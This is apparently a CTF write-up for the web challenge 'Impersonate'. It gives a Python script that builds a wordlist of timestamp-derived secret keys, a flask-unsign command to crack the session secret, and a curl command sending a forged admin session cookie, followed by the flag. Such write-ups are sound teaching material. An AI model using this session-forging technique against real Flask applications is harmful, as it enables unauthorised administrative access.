# Impersonate
## Description
> One may not be the one they claim to be.
> 
> http://chal.competitivecyber.club:9999/

![image](https://github.com/user-attachments/assets/68930f4a-5817-496e-b2d5-9268823832ae)
http://chal.competitivecyber.club:9999/user/fe117fbc-21a5-5858-9e15-c533e05c3a2c
uid = fe117fbc-21a5-5858-9e15-c533e05c3a2c
```
 
# Wordlist untuk server time. 
import hashlib
import requests
import uuid
from datetime import datetime, timedelta

login_url = 'http://chal.competitivecyber.club:9999/'
status_url = 'http://chal.competitivecyber.club:9999/status'

credentials = {
    'username': 'testuser',
    'password': 'testpass'
}

secret = "31333337-1337-1337-1337-133713371337"
username = "testuser"
uid = uuid.uuid5(uuid.UUID(secret), username)
print("Generated UUID:", uid)

session = requests.Session()

def attempt_login():
    response = session.post(login_url, data=credentials, verify=False)
    return response.ok

def fetch_server_time():
    try:
        response = requests.get(status_url)
        response.raise_for_status()
        return response.text.split("Server time:")[1].strip().rstrip(',')
    except requests.RequestException:
        return None

if attempt_login():
    server_time_str = fetch_server_time()
    if server_time_str:
        server_time = datetime.strptime(server_time_str, '%Y-%m-%d %H:%M:%S')
        print(f"Server time: {server_time}")

        secure_keys = {}
        for i in range(1000):
            past_date = server_time - timedelta(seconds=i)
            past_date_str = past_date.strftime('%Y%m%d%H%M%S')
            secure_key = hashlib.sha256(f'secret_key_{past_date_str}'.encode()).hexdigest()
            secure_keys[past_date.strftime('%Y%m%d%H%M%S')] = secure_key

        with open('secure_keys', 'w') as file:
            for key in secure_keys.values():
                file.write(f"{key}\n")

#flask-unsign --wordlist secure_keys.txt --unsign --cookie 'cookies' --no-literal-eval 

# curl --cookie "session='flask-unsign --sign --secret d1f7d4f4df088b51531682b9eade1b37d659b01f373b6c06f16427a817a09665 --cookie \"{'is_admin': True, 'uid': 'fe117fbc-21a5-5858-9e15-c533e05c3a2c', 'username': 'administrator'}\"'" http://chal.competitivecyber.club:9999/admin 
```
## Flag
```
PCTF{Imp3rs0n4t10n_Iz_Sup3r_Ezz}
```
